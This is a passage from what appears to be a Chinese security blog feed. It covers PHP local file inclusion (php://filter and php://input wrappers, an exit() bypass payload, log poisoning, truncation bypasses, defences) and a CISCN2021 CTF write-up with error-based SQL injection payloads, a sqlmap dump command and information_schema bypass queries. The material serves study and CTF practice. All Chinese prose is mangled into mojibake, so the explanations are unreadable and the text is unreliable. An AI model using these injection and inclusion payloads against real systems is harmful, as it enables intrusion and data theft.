alt="php://filterå‚æ•°"></p><p>phpä¼ªåè®®çš„è¿‡æ»¤å™¨åŠŸèƒ½ï¼Œå¯ä»¥é€šè¿‡æ‹¼æ¥å„ç§è¿‡æ»¤å™¨è¾¾åˆ°å¿«é€Ÿè½¬æ¢å­—èŠ‚æµçš„æ•ˆæœã€‚å¦‚ï¼š</p><blockquote><p>php://filter/read=convert.base64-encode/resource=index.php</p><p>å…¶ä¸­<code>filter/[read|write]=[è¿‡æ»¤å™¨]</code>å¯ç®€å†™ä¸º<code>filter/[è¿‡æ»¤å™¨]</code>ï¼Œphpä¼šè‡ªé€‰åˆ¤æ–­æ˜¯readè¿˜æ˜¯writeã€‚</p></blockquote><p>æ­¤æ—¶phpä¼šè¯»å–index.phpæ–‡ä»¶çš„å†…å®¹ï¼Œé€šè¿‡convertè¿‡æ»¤å™¨çš„base64-encodeæ–¹æ³•ï¼Œæœ€æ€»å°†æ‰€å¾—ç»“æœä»¥phpä»£ç çš„å½¢å¼åŒ…å«åˆ°è¿è¡Œçš„phpæ–‡ä»¶ä¹‹ä¸­ï¼Œç”±äºbase64ç¼–ç ä¹‹åçš„å†…å®¹ä¸ä¼šå‡ºç°<code>&lt;?</code>ï¼Œæ‰€ä»¥å¿…ç„¶ä¸ä¼šè¢«è¯†åˆ«ä¸ºphpä»£ç ï¼Œæ•…è€Œèƒ½èµ·åˆ°æ–‡ä»¶è¯»å–çš„ä½œç”¨ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527233338272.png" alt="image-20210527233338272"></p><p>å¯¹å…¶è¿›è¡Œbase64è§£ç å¾—åˆ°æºç </p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527233513514.png" alt="image-20210527233513514"></p><p>å¸¸ç”¨çš„è¿‡æ»¤å™¨æœ‰ï¼š</p><table><thead><tr><th align="left">è¿‡æ»¤å™¨åç§°</th><th align="left">è¯´æ˜</th><th align="left">ç±»åˆ«</th><th align="center">ç‰ˆæœ¬</th></tr></thead><tbody><tr><td align="left">string.rot13</td><td align="left">rot13è½¬æ¢</td><td align="left">å­—ç¬¦ä¸²è¿‡æ»¤å™¨</td><td align="center">PHP&gt;4.3.0</td></tr><tr><td align="left">string.toupperã€string.tolower</td><td align="left">å¤§å°å†™äº’è½¬</td><td align="left">å­—ç¬¦ä¸²è¿‡æ»¤å™¨</td><td align="center">PHP&gt;5.0.0</td></tr><tr><td align="left">string.strip_tags</td><td align="left">å»é™¤<code>&lt;?(.*?)?&gt;</code>çš„å†…å®¹</td><td align="left">string.strip_tags</td><td align="center">PHP&lt;7.3.0</td></tr><tr><td align="left">convert.base64-encodeã€convert.base64-decode</td><td align="left">base64ç¼–ç è½¬æ¢</td><td align="left">è½¬æ¢è¿‡æ»¤å™¨</td><td align="center">PHP&gt;5.0.0</td></tr><tr><td align="left">convert.quoted-printable-encodeã€convert.quoted-printable-decode</td><td align="left">URLç¼–ç è½¬æ¢</td><td align="left">è½¬æ¢è¿‡æ»¤å™¨</td><td align="center">PHP&gt;5.0.0</td></tr><tr><td align="left">convert.iconv.ç¼–ç 1.ç¼–ç 2</td><td align="left">ä»»æ„ç¼–ç è½¬æ¢</td><td align="left">è½¬æ¢è¿‡æ»¤å™¨</td><td align="center">PHP&gt;5.0.0</td></tr><tr><td align="left">zlib.deflateã€zlib.inflate</td><td align="left">zlibå‹ç¼©</td><td align="left">å‹ç¼©è¿‡æ»¤å™¨</td><td align="center">PHP&gt;5.1.0</td></tr><tr><td align="left">bzip2.compressã€bzip2.decompress</td><td align="left">zlibå‹ç¼©</td><td align="left">å‹ç¼©è¿‡æ»¤å™¨</td><td align="center">PHP&gt;5.1.0</td></tr></tbody></table><p><strong>åˆ©ç”¨ php://input åè®®</strong></p><p>ä¸»è¦ç”¨æ¥æ¥æ”¶postæ•°æ®ï¼Œå°†postè¯·æ±‚ä¸­çš„æ•°æ®ä½œä¸ºphpä»£ç æ‰§è¡Œã€‚</p><p>æ¡ä»¶ï¼š<code>allow_url_include = On</code>(PHPç‰ˆæœ¬&gt;5.2åï¼Œé»˜è®¤å€¼ä¸ºOff)</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527235351691.png" alt="image-20210527235351691"></p><h2 id="file-put-contents"><a href="#file-put-contents" class="headerlink" title="file_put_contents"></a>file_put_contents</h2><p>æ‘˜è‡ªï¼š<a href="https://xz.aliyun.com/t/8163#toc-15">file_put_contentå’Œæ­»äº¡Â·æ‚ç³…ä»£ç ä¹‹ç¼˜</a></p><p>ç¤ºä¾‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="variable">$content</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">file_put_contents(<span class="variable">$filename</span>,<span class="string">&#x27;&lt;?php exit();?&gt;&#x27;</span>.<span class="variable">$content</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>$contentåœ¨å¼€å¤´å¢åŠ äº†exitè¿‡ç¨‹ï¼Œå¯¼è‡´å³ä½¿æˆ‘ä»¬æˆåŠŸå†™å…¥å†…å®¹ï¼Œä¹Ÿæ‰§è¡Œä¸äº†ï¼Œè¿™æ—¶å€™å¦‚ä½•ç»•è¿‡ï¼Ÿ</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210529174557298.png" alt="image-20210529174557298"></p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;phpinfo.php&amp;content&#x3D;aPD9waHAgcGhwaW5mbygpOyA&#x2F;Pg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>å¯¹å†™å…¥å†…å®¹ï¼ˆè¿™é‡Œæ˜¯<code>&lt;?php phpinfo(); ?&gt;</code>ï¼‰è¿›è¡ŒBase64ç¼–ç ï¼ˆ<code>PD9waHAgcGhwaW5mbygpOyA/Pg==</code>ï¼‰ï¼Œåœ¨åŒ…å«phpinfo.phpè¿™ä¸ªæ–‡ä»¶æ—¶åˆè¿›è¡ŒBase64è§£ç ï¼Œè¿™æ—¶å†™å…¥å†…å®¹è¿˜åŸï¼Œè€Œæ­»äº¡ä»£ç exit()è¢«è§£ç ä¸ºä¹±ç ï¼Œè¾¾åˆ°ç»•è¿‡ç›®çš„ã€‚</p><p>æ·»åŠ é¢å¤–å­—ç¬¦aï¼šBase64è§£ç æ—¶æ˜¯4ä¸ªbyteä¸€ç»„ï¼Œå‰é¢çš„<code>phpexit</code>ä¸€å…±7ä¸ªå­—ç¬¦ï¼Œå¢åŠ ä¸€ä¸ªaå‡‘æˆ8ä¸ªå­—ç¬¦ï¼Œè¿™æ ·<code>phpexita</code> è¢«æ­£å¸¸è§£ç ï¼Œè€Œåé¢æˆ‘ä»¬å†™å…¥çš„å†…å®¹ä¹Ÿæ‰ä¼šæ­£å¸¸è§£ç ã€‚</p><blockquote><p>base64ç¼–ç ä¸­åªåŒ…å«64ä¸ªå¯æ‰“å°å­—ç¬¦(å¤§å°å†™å­—æ¯ï¼Œ0-9ï¼Œ+ï¼Œ/)ï¼Œè€ŒPHPåœ¨è§£ç base64æ—¶ï¼Œé‡åˆ°ä¸åœ¨å…¶ä¸­çš„å­—ç¬¦æ—¶ï¼Œå°†ä¼šè·³è¿‡è¿™äº›å­—ç¬¦ï¼Œä»…å°†åˆæ³•å­—ç¬¦ç»„æˆä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²è¿›è¡Œè§£ç ã€‚</p></blockquote><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210529180216634.png" alt="image-20210529180216634"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210529180259106.png" alt="image-20210529180259106"></p><h2 id="å…¶ä»–åè®®"><a href="#å…¶ä»–åè®®" class="headerlink" title="å…¶ä»–åè®®"></a>å…¶ä»–åè®®</h2><p>é™¤äº†phpä¼ªåè®®å¤–ï¼ŒPHPè¿˜æ”¯æŒåŒ…å«ä»¥ä¸‹åè®®çš„æ•°æ®æµï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F; â€” è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ</span><br><span class="line">http:&#x2F;&#x2F; â€” è®¿é—® HTTP(s) ç½‘å€</span><br><span class="line">ftp:&#x2F;&#x2F; â€” è®¿é—® FTP(s) URLs</span><br><span class="line">zlib:&#x2F;&#x2F; â€” å‹ç¼©æµ</span><br><span class="line">data:&#x2F;&#x2F; â€” æ•°æ®ï¼ˆRFC 2397ï¼‰</span><br><span class="line">glob:&#x2F;&#x2F; â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼</span><br><span class="line">phar:&#x2F;&#x2F; â€” PHP å½’æ¡£</span><br><span class="line">ssh2:&#x2F;&#x2F; â€” Secure Shell 2</span><br><span class="line">rar:&#x2F;&#x2F; â€” RAR</span><br><span class="line">ogg:&#x2F;&#x2F; â€” éŸ³é¢‘æµ</span><br><span class="line">expect:&#x2F;&#x2F; â€” å¤„ç†äº¤äº’å¼çš„æµ</span><br></pre></td></tr></table></figure><p>å¦‚åˆ©ç”¨fileåè®®ï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527232103966.png" alt="image-20210527232103966"></p><h2 id="é…åˆæ—¥å¿—æ–‡ä»¶"><a href="#é…åˆæ—¥å¿—æ–‡ä»¶" class="headerlink" title="é…åˆæ—¥å¿—æ–‡ä»¶"></a>é…åˆæ—¥å¿—æ–‡ä»¶</h2><p>å¦‚æœçŸ¥é“æœåŠ¡å™¨æ—¥å¿—æ–‡ä»¶çš„è·¯å¾„ï¼Œå¯åœ¨URLè¯·æ±‚ä¸­æ·»åŠ æ”»å‡»ä»£ç ï¼Œæ­¤ä»£ç ä¼šè¢«è®°å½•åœ¨æœåŠ¡å™¨æ—¥å¿—æ–‡ä»¶å†…ï¼Œå†å¯¹æ—¥å¿—æ–‡ä»¶è¿›è¡ŒåŒ…å«ï¼Œæ”»å‡»ä»£ç ä¾¿ä¼šè¢«æ‰§è¡Œã€‚ï¼ˆå‰ææœ‰è®¿é—®æƒé™ï¼‰</p><p>æµ‹è¯•é¶åœºï¼šDVWA</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527230821426.png" alt="image-20210527230821426"></p><p>åœ¨æ—¥å¿—æ–‡ä»¶ä¸­å¯è§ï¼Œéƒ¨åˆ†å­—ç¬¦è¢«URLç¼–ç ï¼Œä»£ç æ— æ³•æ‰§è¡Œï¼Œå¯ç”¨burpsuiteæŠ“åŒ…æ”¹å›ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527231123446.png" alt="image-20210527231123446"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527231156043.png" alt="image-20210527231156043"></p><p>åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´åŒ…å«æ­¤æ—¥å¿—æ–‡ä»¶ï¼Œå³å¯æ‰§è¡Œæ’å…¥ä»£ç </p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527231313524.png" alt="image-20210527231313524"></p><h1 id="ç»•è¿‡æ–¹å¼"><a href="#ç»•è¿‡æ–¹å¼" class="headerlink" title="ç»•è¿‡æ–¹å¼"></a>ç»•è¿‡æ–¹å¼</h1><ul><li>%00æˆªæ–­</li></ul><p>æ¡ä»¶ï¼šmagic_quotes_gps=off      phpç‰ˆæœ¬&lt;5.3.4</p><p>ç¤ºä¾‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="string">&quot;inc/&quot;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] . <span class="string">&quot;.php&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯¹åç¼€åè¿›è¡Œäº†é™åˆ¶ï¼Œå¯æ˜¯æˆ‘ä»¬æ— æ³•ä¸Šä¼ phpæ–‡ä»¶ï¼Œæ»¡è¶³æ¡ä»¶ä¸‹å¯ç”¨00æˆªæ–­ç»•è¿‡ã€‚</p><p>?page=../../../../phpinfo.php%00</p><ul><li>é•¿åº¦æˆªæ–­</li></ul><p>å‰æï¼šPHPç‰ˆæœ¬&lt;5.2.10</p><p>æ“ä½œç³»ç»Ÿå¯¹äºç›®å½•å­—ç¬¦ä¸²å­˜åœ¨é•¿åº¦é™åˆ¶ï¼Œåœ¨linuxä¸‹4096å­—èŠ‚æ—¶ä¼šè¾¾åˆ°æœ€å¤§å€¼ï¼Œåœ¨windowä¸‹æ˜¯256å­—èŠ‚ã€‚åªè¦ä¸æ–­çš„é‡å¤<code>./</code>å³å¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lfi.php?file&#x3D;.&#x2F;.&#x2F;.&#x2F;.&#x2F;[.&#x2F;]+&#x2F;.&#x2F;shell.txt</span><br><span class="line">lfi.php?file&#x3D;.&#x2F;shell.txt&#x2F;.[...]+. # ä»…Windowsä¸‹æœ‰æ•ˆ</span><br></pre></td></tr></table></figure><ul><li>é‡å†™</li></ul><p>?page=â€¦.//â€¦.//â€¦.//phpinfo.php</p><ul><li>åˆ©ç”¨phpä¼ªåè®®ç­‰</li></ul><h1 id="å±å®³"><a href="#å±å®³" class="headerlink" title="å±å®³"></a>å±å®³</h1><p>æœ€ç®€å•çš„ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸Šä¼ ä¸€ä¸ªåŒ…å«webshellå†…å®¹çš„å›¾ç‰‡ï¼Œç„¶åé€šè¿‡åŒ…å«æ­¤å›¾ç‰‡å³å¯å¾—åˆ°ä¸€ä¸ªå¯ä»¥æ§åˆ¶çš„webshellã€‚</p><ul><li>è·å–æ•æ„Ÿä¿¡æ¯</li><li>æ‰§è¡Œä»»æ„å‘½ä»¤</li><li>è·å–æœåŠ¡å™¨æƒé™</li></ul><h1 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h1><ol><li>å°½é‡ä¸ä½¿ç”¨åŠ¨æ€åŒ…å«ï¼Œæ— éœ€æƒ…å†µä¸‹è®¾ç½®allow_url_includeå’Œallow_url_fopenä¸ºå…³é—­;</li><li>å¯¹å¯ä»¥åŒ…å«çš„æ–‡ä»¶è¿›è¡Œé™åˆ¶ï¸°ä½¿ç”¨ç™½åå•çš„æ–¹å¼ï¼Œæˆ–è€…è®¾ç½®åŒ…å«çš„ç›®å½•ï¼Œopen_basedir ;</li><li>ä¸¥æ ¼æ£€æŸ¥ç”¨æˆ·è¾“å…¥ï¼Œå‚æ•°ä¸­ä¸å…è®¸å‡ºç°../ä¹‹ç±»çš„ç›®å½•è·³è½¬ç¬¦;</li><li>ä¸¥æ ¼æ£€æŸ¥å˜é‡æ˜¯å¦åˆå§‹åŒ–;</li><li>ä¸è¦ä»…ä»…åœ¨å®¢æˆ·ç«¯åšæ•°æ®çš„éªŒè¯ä¸è¿‡æ»¤ï¼Œå…³é”®çš„è¿‡æ»¤æ­¥éª¤åœ¨æœåŠ¡ç«¯è¿›è¡Œã€‚</li></ol><p>å‚è€ƒèµ„æ–™ï¼š</p><p>[1] <a href="https://www.0x002.com/2020/PHP%20%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(LFI)%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">PHP æœ¬åœ°æ–‡ä»¶åŒ…å«(LFI)æ¼æ´å­¦ä¹ ç¬”è®°</a></p><p>[2] <a href="https://xz.aliyun.com/t/8163#toc-15">file_put_contentå’Œæ­»äº¡Â·æ‚ç³…ä»£ç ä¹‹ç¼˜</a></p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
          <category> æ–‡ä»¶åŒ…å« </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webå®‰å…¨ </tag>
            
            <tag> æ–‡ä»¶åŒ…å« </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä»CISCN2021åˆèµ›ä¹ å¾—</title>
      <link href="posts/59734.html"/>
      <url>posts/59734.html</url>
      
        <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h2><p>è¿™é‡Œç®€è¦è®°å½•ä¸‹æˆ‘çš„æ€è·¯ä»¥åŠå­¦åˆ°çš„å§¿åŠ¿ã€‚</p><p>ä¸€å¼€å§‹ç»è¿‡å‡ æ¬¡å°è¯•å‘ç°unameå¤„å­˜åœ¨æ³¨å…¥ç‚¹ä¸”ä¸ºå•å¼•å·æ‹¬å·é—­åˆï¼Œåœ¨sqlè¯­å¥ä¸ºçœŸæ—¶ï¼Œè¿”å› login ,ä¸ºå‡æ—¶ç©ºç™½ï¼Œäºæ˜¯å°±å‚»ä¹ä¹è®¤ä¸ºæ˜¯å¸ƒå°”ç›²æ³¨ï¼Œè€Œå¿½ç•¥äº†åŠ å¼•å·æ—¶é¡µé¢ä¼šè¿”å›æŠ¥é”™ä¿¡æ¯ã€‚æ‰€ä»¥å¯ä»¥ç”¨æ›´ä¸ºç®€å•çš„æŠ¥é”™æ³¨å…¥çš„é¢˜ï¼Œè€Œæˆ‘å´ç”¨å¸ƒå°”ç›²æ³¨æ£é¼“äº†åŠå¤©ã€‚å¾—åˆ°åº“ååï¼Œå‘ç°informationè¢«è¿‡æ»¤ï¼Œæ— æ³•æŸ¥è¡¨å’Œåˆ—åã€‚è‰°éš¾ç»•è¿‡åï¼Œåˆ©ç”¨æ— åˆ—åæ³¨å…¥ï¼Œmysqlå­—ç¬¦ä¸²é€ä½æ¯”è¾ƒæŠŠflagç»™è¯•äº†å‡ºæ¥ï¼Œä½†å¯èƒ½å› ä¸ºå¤§å°å†™çš„åŸå› å¯¼è‡´æäº¤é”™è¯¯ï¼Œç™½å¹²ä¸€åœºï¼ˆåæ¥æ‰çŸ¥é“mysqlå­—ç¬¦ä¸²æ¯”è¾ƒä¸åŒºåˆ†å¤§å°å†™ğŸ˜‚ï¼‰è§£å†³æ–¹æ³•è§ä¸‹æ–‡ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210515183010308.png" alt="image-20210515183010308"></p><p>æ­£è§£æŠ¥é”™æ³¨å…¥</p><p>æš´åº“</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;1&#39;)||extractvalue(1,concat(&#39;~&#39;,database()))%23&amp;passwd&#x3D;1</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨sqlmapè·å–è¡¨å</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r &quot; 1.txt&quot; â€“dump -D â€œsecurityâ€</span><br></pre></td></tr></table></figure><p>æš´åˆ—å</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;1&#39;) ||updatexml(&quot;~&quot;,concat(&quot;~&quot;,(select * from (select * from flag as a join flag b)c)),&quot;~&quot;)%23&amp;passwd&#x3D;1</span><br></pre></td></tr></table></figure><p>å¾—flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;1&#39;)||updatexml(1,((select &#96;e4f94828-d693-4ea1-8759-051b98824ce3&#96; from flag limit 0,1)),1)%23&amp;passwd&#x3D;1</span><br></pre></td></tr></table></figure><p><strong>æ–°å§¿åŠ¿&amp;&amp;ä¸è¶³</strong></p><ol><li>å½“information_schemaè¢«è¿‡æ»¤ï¼Œæ— æ³•æŸ¥åº“ä¸­è¡¨å’Œåˆ—æ—¶ï¼Œå¯ä»¥ç”¨<code>sys.schema_table_statistics_with_buffer</code>ã€<code>sys.x$schema_flattened_keys</code> ç­‰æ¥çˆ†è¡¨ã€‚</li><li>å½“åˆ—åä¸çŸ¥é“æ—¶ï¼Œä¸€èˆ¬åˆ©ç”¨information_schema_columnsï¼›å†è€…å¯åˆ©ç”¨joinè¿›è¡Œæ— åˆ—åæ³¨å…¥å¾—åˆ°åˆ—åï¼›è‹¥åœ¨joinè¢«è¿‡æ»¤æˆ–ç›²æ³¨ç­‰æƒ…å†µï¼Œæ­¤æ—¶åˆ™å¯ä»¥è€ƒè™‘mysqlå­—ç¬¦ä¸²é€ä½æ¯”è¾ƒå¤§å°ã€‚</li><li>å½“<code>||</code> ã€<code>or</code> ç­‰å¸¸ç”¨å­—ç¬¦è¿‡æ»¤æ—¶ä¹Ÿè®¸å¯ä»¥ä½¿ç”¨ <code>^</code> å¼‚æˆ–è¿™ä¸ªç¬¦å·ï¼Œå¦‚<code>?id=1&#39;^(payload)^1--+</code></li><li>postä¼ å‚çš„Pythonè„šæœ¬ç¼–å†™å¾…åŠ å¼º</li></ol><h3 id="bypass-information-schema"><a href="#bypass-information-schema" class="headerlink" title="bypass information_schema"></a>bypass information_schema</h3><blockquote><p>Mysql5.7åæ–°å¢äº†sysåº“ï¼Œå…¶åŸºç¡€æ•°æ®æ¥è‡ªäºperformance_chemaå’Œinformation_schemaä¸¤ä¸ªåº“ï¼Œæœ¬èº«æ•°æ®åº“ä¸å­˜å‚¨æ•°æ®ã€‚å¯é€šè¿‡sysåº“å–ä»£information_schemaè·å–è¡¨åã€‚</p></blockquote><p>sys ä¸­å¯åˆ©ç”¨çš„è§†å›¾</p><ul><li><strong>sys.schema_table_statistics_with_buffer</strong></li><li><strong>sys.x$schema_table_statistics_with_buffer</strong></li><li><strong>sys.schema_auto_increment_columns</strong></li><li><strong>sys.x$ps_schema_table_statistics_io</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> sys.schema_table_statistics_with_buffer <span class="keyword">where</span> table_schema<span class="operator">=</span>database();</span><br></pre></td></tr></table></figure><p>å½“orè¢«è¿‡æ»¤ï¼ˆæ²¡è¿‡æ»¤inï¼‰æ—¶ï¼Œå¯åˆ©ç”¨innodbå­˜å‚¨å¼•æ“è·å–è¡¨å</p><ul><li><strong>mysql.innodb_table_stats</strong> (æ­¤è¡¨ä¸­åº“åå­—æ®µæ˜¯database_nameï¼Œè€Œétable_schema)</li><li><strong>mysql.innodb_index_stats</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> mysql.innodb_table_stats <span class="keyword">where</span> database_name<span class="operator">=</span>database();</span><br></pre></td></tr></table></figure><h3 id="join"><a href="#join" class="headerlink" title="join"></a>join</h3><p>é€šè¿‡joinè¿›è¡Œæ— åˆ—åæ³¨å…¥è·å–åˆ—å</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users a <span class="keyword">join</span> users b)c;</span><br><span class="line">ERROR <span class="number">1060</span> (<span class="number">42</span>S21): Duplicate <span class="keyword">column</span> name <span class="string">&#x27;id&#x27;</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users a <span class="keyword">join</span> users b <span class="keyword">using</span>(id))c;</span><br><span class="line">ERROR <span class="number">1060</span> (<span class="number">42</span>S21): Duplicate <span class="keyword">column</span> name <span class="string">&#x27;username&#x27;</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users a <span class="keyword">join</span> users b <span class="keyword">using</span>(id,username))c;</span><br><span class="line">ERROR <span class="number">1060</span> (<span class="number">42</span>S21): Duplicate <span class="keyword">column</span> name <span class="string">&#x27;password&#x27;</span></span><br></pre></td></tr></table></figure><p>åœ¨å­¦ä¹ å¤§ä½¬wpæ—¶è¿˜çœ‹åˆ°åˆ©ç”¨joinç»•è¿‡é€—å·è¿‡æ»¤ï¼Œtql</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,3--+</span></span><br></pre></td></tr></table></figure><p>ä¸ç”¨é€—å·</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select * from (select 1)a join (select 2)b join (select 3)c--+</span></span><br></pre></td></tr></table></figure><h3 id="mysqlå­—ç¬¦ä¸²é€ä½æ¯”è¾ƒ"><a href="#mysqlå­—ç¬¦ä¸²é€ä½æ¯”è¾ƒ" class="headerlink" title="mysqlå­—ç¬¦ä¸²é€ä½æ¯”è¾ƒ"></a>mysqlå­—ç¬¦ä¸²é€ä½æ¯”è¾ƒ</h3><p>ç»™å®šä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œä¼šå„å–ä¸¤ä¸ªå­—ç¬¦ä¸²çš„é¦–å­—ç¬¦asciiç æ¥æ¯”è¾ƒï¼Œå¦‚ä¸‹å›¾</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210517195727369.png" alt="image-20210517195727369"></p><p>ç”±æ­¤å¯çŸ¥åä¸€å­—ç¬¦ä¸²é¦–ä½ä¸ºfï¼Œè‹¥é¦–ä½ç›¸åŒï¼Œåˆ™ä¼šæ¯”è¾ƒä¸‹ä¸€ä½ï¼Œä»¥æ­¤ç±»æ¨ä¾¿å¯å¾—åˆ°åä¸€å­—ç¬¦ä¸²å†…å®¹ã€‚</p><p>ä½†mysqlæ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²æ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„ï¼æœ¬åº”æ˜¯B(66)&lt;a(97)</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210517210315933.png" alt="image-20210517210315933"></p><p>æ€ä¹ˆèƒ½è¾¾åˆ°åŒºåˆ†å¤§å°å†™çš„æ•ˆæœå‘¢ï¼Ÿæˆ‘åœ¨è¿™ç¯‡æ–‡ç« ä¸­æ‰¾åˆ°ç­”æ¡ˆï¼ˆå¤§ä½¬tqlï¼ï¼‰</p><p><a href="https://nosec.org/home/detail/3830.html">æ— éœ€â€œinâ€çš„SQLç›²æ³¨</a></p><p>å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºäºŒè¿›åˆ¶æ ¼å¼åï¼Œä¼šå¼ºåˆ¶è¿›è¡Œå­—èŠ‚å¯¹å­—èŠ‚çš„æ¯”è¾ƒ</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210517215444478.png" alt="image-20210517215444478"></p><p>ä½†binaryå‡½æ•°ä¸­çš„inè¢«è¿‡æ»¤äº†ï¼Œæ— æ³•ä½¿ç”¨ã€‚</p><p>æ–°çš„æ–¹æ³•æ˜¯ç”¨concatæ‹¼æ¥ä¸€ä¸ªJSONå¯¹è±¡ï¼Œå³<code>select concat(&#39;B&#39;,cast(0 as json))</code>ä¹Ÿä¼šè¿”å›ä¸€äºŒè¿›åˆ¶å­—ç¬¦ä¸²</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210517222742475.png" alt="image-20210517222742475"></p><p>ä¹Ÿå¯ä»¥æŠŠå­—ç¬¦è½¬åŒ–ä¸ºåå…­è¿›åˆ¶åæ¯”è¾ƒï¼ŒB(0x42)&lt;a</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>ç”±äºé¢˜ç›®ç¯å¢ƒå·²å…³ï¼Œè¿™é‡Œåœ¨BUUCTFæ‰¾åˆ°äº†ä¸€é“ç±»ä¼¼çš„é¢˜ä»¥ç»ƒä¹ 